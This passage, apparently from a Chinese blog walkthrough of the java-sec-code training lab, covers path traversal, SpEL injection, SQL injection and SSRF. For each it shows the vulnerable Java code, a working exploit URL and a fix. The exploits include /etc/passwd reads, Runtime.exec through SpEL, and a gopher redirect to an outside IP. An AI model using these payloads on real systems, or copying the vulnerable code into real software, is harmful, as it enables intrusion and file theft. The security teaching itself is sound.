IOException &#123;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    private String getImgBase64(String imgFile) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));</span><br><span class="line">    logger.info(&quot;File path: &quot; + imgFile);</span><br><span class="line"></span><br><span class="line">    File f &#x3D; new File(imgFile);</span><br><span class="line">    if (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">        return new String(Base64.encodeBase64(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;File doesn&#39;t exist or is not a file.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有对文件名做校验存在漏洞</p><p>访问<a href="http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd">http://172.20.10.6:8080/java_sec_code_war/path_traversal/vul?filepath=../../../../../../../../etc/passwd</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026094047542.png" alt="image-20211026094047542"></p><p>修复代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;sec&quot;)</span><br><span class="line">public String getImageSec(String filepath) throws IOException &#123;</span><br><span class="line">    if (SecurityUtil.pathFilter(filepath) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        logger.info(&quot;Illegal file path: &quot; + filepath);</span><br><span class="line">        return &quot;Bad boy. Illegal file path.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用pathFilter对输入的路径进行过滤，跟进去查看pathFilter()函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String pathFilter(String filepath) &#123;</span><br><span class="line">    String temp &#x3D; filepath;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; use while to sovle multi urlencode</span><br><span class="line">    while (temp.indexOf(&#39;%&#39;) !&#x3D; -1) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            temp &#x3D; URLDecoder.decode(temp, &quot;utf-8&quot;);</span><br><span class="line">        &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">            logger.info(&quot;Unsupported encoding exception: &quot; + filepath);</span><br><span class="line">            return null;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (temp.contains(&quot;..&quot;) || temp.charAt(0) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return filepath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对输入的参数先做检测若是URL编码先做解码，然后检测对”..”,”/“参数做过滤。</p><h2 id="12-SpEL"><a href="#12-SpEL" class="headerlink" title="12.SpEL"></a>12.SpEL</h2><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;spel&#x2F;vuln&quot;)</span><br><span class="line">public String rce(String expression) &#123;</span><br><span class="line">    ExpressionParser parser &#x3D; new SpelExpressionParser();</span><br><span class="line">    &#x2F;&#x2F; fix method: SimpleEvaluationContext</span><br><span class="line">    return parser.parseExpression(expression).getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接将用户的输入当作表达式内容进行解析。</p><p>输入一个简单的乘法运算<code>2*2</code>，可以看到返回的值是经过解析后的<code>4</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095240922.png" alt="image-20211026095240922"></p><p>执行下系统命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;spel&#x2F;vuln&#x2F;?expression&#x3D;T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026095448592.png" alt="image-20211026095448592"></p><ol><li><a href="https://www.kingkk.com/2019/05/SPEL表达式注入-入门篇/">SPEL表达式注入-入门篇</a></li><li><a href="http://rui0.cn/archives/1043">由浅入深SpEL表达式注入漏洞</a></li></ol><h2 id="13-SQLI"><a href="#13-SQLI" class="headerlink" title="13.SQLI"></a>13.SQLI</h2><p>Sql注入修改mysql的配置之后即可进行，整体比较简单</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)</span><br><span class="line">public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connect to database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; sqli vuln code</span><br><span class="line">        Statement statement &#x3D; con.createStatement();</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; &#39;&quot; + username + &quot;&#39;&quot;;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        ResultSet rs &#x3D; statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry,can&#96;t find the Driver!&quot;);</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接对输入的username参数进行拼接存在sql注入漏洞</p><p>访问url：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;sqli&#x2F;mybatis&#x2F;vuln01?username&#x3D;joychou%27%20or%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211026181809439.png" alt="image-20211026181809439"></p><p>控制台输出如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &#x3D;&#x3D;&gt;  Preparing: select * from users where username &#x3D; &#39;joychou&#39; or &#39;1&#39;&#x3D;&#39;1&#39; </span><br><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &#x3D;&#x3D;&gt; Parameters: </span><br><span class="line">DEBUG 9753 --- [nio-8080-exec-2] o.j.m.UserMapper.findByUserNameVuln01    : &lt;&#x3D;&#x3D;      Total: 2</span><br></pre></td></tr></table></figure><p>修复代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;sec&quot;)</span><br><span class="line">public String jdbc_sqli_sec(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connecting to Database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; fix code</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; ?&quot;;</span><br><span class="line">        PreparedStatement st &#x3D; con.prepareStatement(sql);</span><br><span class="line">        st.setString(1, username);</span><br><span class="line"></span><br><span class="line">        logger.info(st.toString());  &#x2F;&#x2F; sql after prepare statement</span><br><span class="line">        ResultSet rs &#x3D; st.executeQuery();</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry, can&#96;t find the Driver!&quot;);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>prepareStatement()通过预处理方式进行修复</p><blockquote><p>预处理的修复原理：针对字符串类型的SQL注入，是在字符串两边加上一对单号哈<code>&#39;&#39;</code>，对于中间点的单引号对其进行转义<code>\&#39;</code>，让其变成字符的单引号。Mybatis的<code>#&#123;&#125;</code>也是预处理方式处理SQL注入。</p><p>在使用了mybatis框架后，需要进行排序功能时，在mapper.xml文件中编写SQL语句时，注意orderBy后的变量要使用<code>$&#123;&#125;</code>,而不用<code>#&#123;&#125;</code>。因为<code>#&#123;&#125;</code>变量是经过预编译的，<code>$&#123;&#125;</code>没有经过预编译。虽然<code>$&#123;&#125;</code>存在SQL注入的风险，但orderBy必须使用<code>$&#123;&#125;</code>，因为<code>#&#123;&#125;</code>会多出单引号<code>&#39;&#39;</code>导致SQL语句失效。为防止SQL注入只能自己对其过滤。</p></blockquote><p>根据下面的结果可以发现<code>order by &#39;username&#39;</code>并没有用，第一条SQL和第二条SQL效果一样。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users order by &#39;username&#39; desc -- 结果为 joychou wilson lightless </span><br><span class="line">select * from users                      -- 结果为 joychou wilson lightless </span><br><span class="line">select * from users order by username        -- 结果为 joychou lightless wilson</span><br><span class="line">select * from users order by username desc   -- 结果为 wilson lightless joychou</span><br></pre></td></tr></table></figure><h2 id="14-SSRF"><a href="#14-SSRF" class="headerlink" title="14.SSRF"></a>14.SSRF</h2><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h3><blockquote><p>SSRF(Server-side Request Forge, 服务端请求伪造)。 由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p></blockquote><h3 id="2-支持协议"><a href="#2-支持协议" class="headerlink" title="2.支持协议"></a>2.支持协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file ftp mailto http https jar netdoc</span><br></pre></td></tr></table></figure><p>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</p><h3 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3.重定向"></a>3.重定向</h3><p>Java默认会跟随重定向。先在一台服务器上写一个test.php，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url &#x3D; &#39;gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou&#39;;</span><br><span class="line">header(&quot;location: $url&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>启动apache 放置对应文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apachectl start</span><br><span class="line">cp ~&#x2F;Desktop&#x2F;test.php &#x2F;Library&#x2F;WebServer&#x2F;Documents</span><br></pre></td></tr></table></figure><p>访问payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php</span><br></pre></td></tr></table></figure><p>收到异常：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.net.MalformedURLException: unknown protocol: gopher</span><br></pre></td></tr></table></figure><p>跟踪报错代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private boolean followRedirect() throws IOException &#123;</span><br><span class="line">    if(!this.getInstanceFollowRedirects()) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        final int var1 &#x3D; this.getResponseCode();</span><br><span class="line">        if(var1 &gt;&#x3D; 300 &amp;&amp; var1 &lt;&#x3D; 307 &amp;&amp; var1 !&#x3D; 306 &amp;&amp; var1 !&#x3D; 304) &#123;</span><br><span class="line">            final String var2 &#x3D; this.getHeaderField(&quot;Location&quot;);</span><br><span class="line">            if(var2 &#x3D;&#x3D; null) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                URL var3;</span><br><span class="line">                try &#123;</span><br><span class="line">                    &#x2F;&#x2F; 该行代码发生异常，var2变量值为&#96;gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou&#96;</span><br><span class="line">                    var3 &#x3D; new URL(var2);</span><br><span class="line">                    &#x2F;* 该行代码，表示传入的协议必须和重定向的协议一致</span><br><span class="line">                     * 即http:&#x2F;&#x2F;joychou.me&#x2F;302.php的协议必须和gopher:&#x2F;&#x2F;35.185.163.134:2333&#x2F;_joy%0achou一致</span><br><span class="line">                     *&#x2F;</span><br><span class="line">                    if(!this.url.getProtocol().equalsIgnoreCase(var3.getProtocol())) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (MalformedURLException var8) &#123;</span><br><span class="line">                    var3 &#x3D; new URL(this.url, var2);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>从上面的followRedirect方法可以看到：</p><ul><li>实际跳转的URL也在限制的协议内</li><li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li></ul><p>所以，Java的SSRF利用方式比较局限：</p><ul><li>利用file协议任意文件读取</li><li>利用http协议探测端口或攻击内网服务</li></ul><h3 id="4-DNS-Rebinding"><a href="#4-DNS-Rebinding" class="headerlink" title="4.DNS Rebinding"></a>4.DNS Rebinding</h3><p>先了解下Java应用的TTL机制。Java应用的默认TTL为10s，这个默认配置会导致DNS Rebinding绕过失败。也就是说，默认情况下，Java应用不受DNS Rebinding影响。</p><p>Java TTL的值可以通过下面三种方式进行修改：</p><ol><li><p>JVM添加启动参数<code>-Dsun.net.inetaddr.ttl=0</code></p></li><li><p>通过代码进行修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);</span><br></pre></td></tr></table></figure></li><li><p>修改<code>java.security</code>里的<code>networkaddress.cache.negative.ttl</code>变量为0</p></li></ol><h3 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h3><ul><li>Java默认跟随重定向；</li><li>Java默认TTL为10；</li><li>是否受DNS Rebinding影响取决于缓存；</li><li>如果发起网络请求的类是带HTTP开头，那只支持HTTP、HTTPS协议。</li><li>传入的URL协议必须和重定向后的URL协议一致。如果不一致，相当于没有进行重定向，返回空页面。</li></ul><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;urlConnection&#x2F;vuln&quot;, method &#x3D; &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span><br><span class="line">public String URLConnectionVuln(String url) &#123;</span><br><span class="line">    return HttpUtils.URLConnection(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进URLConnectiong(url)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String URLConnection(String url) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        URL u &#x3D; new URL(url);</span><br><span class="line">        URLConnection urlConnection &#x3D; u.openConnection();</span><br><span class="line">        BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); &#x2F;&#x2F;send request</span><br><span class="line">        &#x2F;&#x2F; BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));</span><br><span class="line">        String inputLine;</span><br><span class="line">        StringBuilder html &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        while ((inputLine &#x3D; in.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            html.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        return html.toString();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接调用了URLConnection()方法 导致存在任意文件读</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;java_sec_code_war&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211027092620488.png" alt="image-20211027092620488"></p><p>修复代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;urlConnection&#x2F;sec&quot;)</span><br><span class="line">public String URLConnectionSec(String url) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Decline not http&#x2F;https protocol</span><br><span class="line">    if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">        return &quot;[-] SSRF check failed&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        SecurityUtil.startSSRFHook();</span><br><span class="line">        return HttpUtils.URLConnection(url);</span><br><span class="line">    &#125; catch (SSRFException | IOException e) &#123;</span><br><span class="line">        return e.getMessage();</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        SecurityUtil.stopSSRFHook();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过isHTTP()函数来看判断是否是http和https协议，之后调用钩子去调用SocketHookFactory，具体防护在SSRFChecker.java</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package org.joychou.security.ssrf;</span><br><span class="line"></span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.URI;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.lang.StringUtils;</span><br><span class="line">import org.apache.commons.net.util.SubnetUtils;</span><br><span class="line">import org.joychou.config.WebConfig;</span><br><span class="line">import org.joychou.security.SecurityUtil;</span><br><span class="line">import org.slf4j.Logger;</span><br><span class="line">import org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class SSRFChecker &#123;</span><br><span class="line"></span><br><span class="line">    private static Logger logger &#x3D; LoggerFactory.getLogger(SSRFChecker.class);</span><br><span class="line"></span><br><span class="line">    public static boolean checkURLFckSSRF(String url) &#123;</span><br><span class="line">        if (null &#x3D;&#x3D; url) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; ssrfSafeDomains &#x3D; WebConfig.getSsrfSafeDomains();</span><br><span class="line">        try &#123;</span><br><span class="line">            String host &#x3D; SecurityUtil.gethost(url);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; 必须http&#x2F;https</span><br><span class="line">            if (!SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (ssrfSafeDomains.contains(host)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            for (String ssrfSafeDomain : ssrfSafeDomains) &#123;</span><br><span class="line">                if (host.endsWith(&quot;.&quot; + ssrfSafeDomain)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 解析url的ip，判断ip是否是内网ip，所以TTL设置为0的情况不适用。</span><br><span class="line">     * url只允许https或者http，并且设置默认连接超时时间。</span><br><span class="line">     * 该修复方案会主动请求重定向后的链接。</span><br><span class="line">     *</span><br><span class="line">     * @param url        check的url</span><br><span class="line">     * @param checkTimes 设置重定向检测的最大次数，建议设置为10次</span><br><span class="line">     * @return 安全返回true，危险返回false</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static boolean checkSSRF(String url, int checkTimes) &#123;</span><br><span class="line"></span><br><span class="line">        HttpURLConnection connection;</span><br><span class="line">        int connectTime &#x3D; 5 * 1000;  &#x2F;&#x2F; 设置连接超时时间5s</span><br><span class="line">        int i &#x3D; 1;</span><br><span class="line">        String finalUrl &#x3D; url;</span><br><span class="line">        try &#123;</span><br><span class="line">            do &#123;</span><br><span class="line">                &#x2F;&#x2F; 判断当前请求的URL是否是内网ip</span><br><span class="line">                if (isInternalIpByUrl(finalUrl)) &#123;</span><br><span class="line">                    logger.error(&quot;[-] SSRF check failed. Dangerous url: &quot; + finalUrl);</span><br><span class="line">                    return false;  &#x2F;&#x2F; 内网ip直接return，非内网ip继续判断是否有重定向</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                connection &#x3D; (HttpURLConnection) new URL(finalUrl).openConnection();</span><br><span class="line">                connection.setInstanceFollowRedirects(false);</span><br><span class="line">                connection.setUseCaches(false); &#x2F;&#x2F; 设置为false，手动处理跳转，可以拿到每个跳转的URL</span><br><span class="line">                connection.setConnectTimeout(connectTime);</span><br><span class="line">                &#x2F;&#x2F;connection.setRequestMethod(&quot;GET&quot;);</span><br><span class="line">                connection.connect(); &#x2F;&#x2F; send dns request</span><br><span class="line">                int responseCode &#x3D; connection.getResponseCode(); &#x2F;&#x2F; 发起网络请求</span><br><span class="line">                if (responseCode &gt;&#x3D; 300 &amp;&amp; responseCode &lt;&#x3D; 307 &amp;&amp; responseCode !&#x3D; 304 &amp;&amp; responseCode !&#x3D; 306) &#123;</span><br><span class="line">                    String redirectedUrl &#x3D; connection.getHeaderField(&quot;Location&quot;);</span><br><span class="line">                    if (null &#x3D;&#x3D; redirectedUrl)</span><br><span class="line">                        break;</span><br><span class="line">                    finalUrl &#x3D; redirectedUrl;</span><br><span class="line">                    i +&#x3D; 1;  &#x2F;&#x2F; 重定向次数加1</span><br><span class="line">                    logger.info(&quot;redirected url: &quot; + finalUrl);</span><br><span class="line">                    if (i &#x3D;&#x3D; checkTimes) &#123;</span><br><span class="line">                        return false;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; else</span><br><span class="line">                    break;</span><br><span class="line">            &#125; while (connection.getResponseCode() !&#x3D; HttpURLConnection.HTTP_OK);</span><br><span class="line">            connection.disconnect();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return true;  &#x2F;&#x2F; 如果异常了，认为是安全的，防止是超时导致的异常而验证不成功。</span><br><span class="line">        &#125;</span><br><span class="line">        return true; &#x2F;&#x2F; 默认返回true</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 判断一个URL的IP是否是内网IP</span><br><span class="line">     *</span><br><span class="line">     * @return 如果是内网IP，返回true；非内网IP，返回false。</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static boolean isInternalIpByUrl(String url) &#123;</span><br><span class="line"></span><br><span class="line">        String host &#x3D; url2host(url);</span><br><span class="line">        if (host.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; &#x2F;&#x2F; 异常URL当成内网IP等非法URL处理</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String ip &#x3D; host2ip(host);</span><br><span class="line">        if (ip.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; &#x2F;&#x2F; 如果域名转换为IP异常，则认为是非法URL</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 使用SubnetUtils库判断ip是否在内网网段</span><br><span class="line">     *</span><br><span class="line">     * @param strIP ip字符串</span><br><span class="line">     * @return 如果是内网ip，返回true，否则返回false。</span><br><span class="line">     *&#x2F;</span><br><span class="line">    static boolean isInternalIp(String strIP) &#123;</span><br><span class="line">        if (StringUtils.isEmpty(strIP)) &#123;</span><br><span class="line">            logger.error(&quot;[-] SSRF check failed. IP is empty. &quot; + strIP);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;String&gt; blackSubnets &#x3D; WebConfig.getSsrfBlockIps();</span><br><span class="line">        for (String subnet : blackSubnets) &#123;</span><br><span class="line">            SubnetUtils utils &#x3D; new SubnetUtils(subnet);</span><br><span class="line">            if (utils.getInfo().isInRange(strIP)) &#123;</span><br><span class="line">                logger.error(&quot;[-] SSRF check failed. Internal IP: &quot; + strIP);</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * host转换为IP</span><br><span class="line">     * 会将各种进制的ip转为正常ip</span><br><span class="line">     * 167772161转换为10.0.0.1</span><br><span class="line">     * 127.0.0.1.xip.io转换为127.0.0.1</span><br><span class="line">     *</span><br><span class="line">     * @param host 域名host</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static String host2ip(String host) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            InetAddress IpAddress &#x3D; InetAddress.getByName(host); &#x2F;&#x2F;  send dns request</span><br><span class="line">            return IpAddress.getHostAddress();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 从URL中获取host，限制为http&#x2F;https协议。只支持http:&#x2F;&#x2F; 和 https:&#x2F;&#x2F;，不支持&#x2F;&#x2F;的http协议。</span><br><span class="line">     *</span><br><span class="line">     * @param url http的url</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private static String url2host(String url) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; 使用URI，而非URL，防止被绕过。</span><br><span class="line">            URI u &#x3D; new URI(url);</span><br><span class="line">            if (SecurityUtil.isHttp(url)) &#123;</span><br><span class="line">                return u.getHost();</span><br><span class="line">            &#125;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="15-SSTI"><a href="#15-SSTI" class="headerlink" title="15.SSTI"></a>15.SSTI</h2><blockquote><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p></blockquote><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;velocity&quot;)</span><br><span class="line">public void velocity(String template) &#123;</span><br><span class="line">    Velocity.init();</span><br><span class="line"></span><br><span class="line">    VelocityContext context &#x3D; new VelocityContext();</span><br><span class="line"></span><br><span class="line">    context.put(&quot;author&quot;, &quot;Elliot A.&quot;);</span><br><span class="line">    context.put(&quot;address&quot;, &quot;217 E Broadway&quot;);</span><br><span class="line">    context.put(&quot;phone&quot;, &quot;555-1337&quot;);</span><br><span class="line"></span><br><span class="line">    StringWriter swOut &#x3D; new 